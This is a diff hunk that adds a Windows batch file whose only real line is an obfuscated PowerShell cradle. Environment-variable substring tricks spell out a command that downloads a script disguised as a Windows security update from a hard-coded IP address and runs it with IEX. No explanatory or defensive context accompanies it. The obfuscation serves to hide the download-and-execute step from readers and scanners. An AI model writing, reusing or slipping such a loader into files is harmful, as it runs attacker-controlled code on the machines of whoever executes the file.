@@ -1,0 +1,2 @@
+@ECHO OFF
+po""""w""rsh%CommonProgramFiles:~-2,1%ll%ProgramFiles(x86):~16,1%-nop%CommonProgramFiles(x86):~10,-24%-c%ProgramW6432:~10,-5%"IEX (New-Obje%PUBLIC:~-1%t Net.W%PUBLIC:~-10,-9%%PUBLIC:~-4,-3%C%CommonProgramFiles(x86):~-3,1%i%HOMEPATH:~3,1%%windir:~5,-4%t).%ProgramData:~-4,-3%ownloadStri%SystemRoot:~-5,-4%g%CommonProgramFiles(x86):~-18,-17%'ht%ALLUSERSPROFILE:~-2,1%p://10.15%CommonProgramFiles(x86):~20,-14%.197.13/Wi%APPDATA:~-2,-1%SecurityUp%OS:~-7,-6%ate'%CommonProgramFiles(x86):~21,1%"
